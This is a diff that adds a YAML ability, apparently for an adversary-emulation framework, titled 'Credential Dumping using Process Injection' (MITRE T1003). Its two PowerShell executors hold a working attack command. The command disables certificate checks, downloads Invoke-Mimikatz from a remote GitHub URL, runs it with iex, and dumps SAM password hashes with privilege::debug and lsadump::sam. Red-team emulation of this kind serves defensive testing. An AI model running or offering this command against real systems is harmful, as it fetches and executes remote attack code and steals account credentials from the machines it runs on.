@@ -1,0 +1,52 @@
+ability_id: effbedc1-1bc8-4a75-9395-980559700008
+access: {}
+additional_info: {}
+buckets:
+- credential-access
+delete_payload: true
+description: Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes
+  via process injection into LSASS.
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "[System.Net.ServicePointManager]::ServerCertificateValidationCallback\
+    \ = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"\
+    https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1\"\
+    );\niex $result;\nfunction hashdump\n{\n    Invoke-Mimikatz -Command \"privilege::debug\
+    \ token::elevate lsadump::sam exit\"\n};\nhashdump;"
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "[System.Net.ServicePointManager]::ServerCertificateValidationCallback\
+    \ = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"\
+    https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1\"\
+    );\niex $result;\nfunction hashdump\n{\n    Invoke-Mimikatz -Command \"privilege::debug\
+    \ token::elevate lsadump::sam exit\"\n};\nhashdump;"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Credential Dumping using Process Injection
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: credential-access
+technique_id: T1003
+technique_name: Credential Dumping
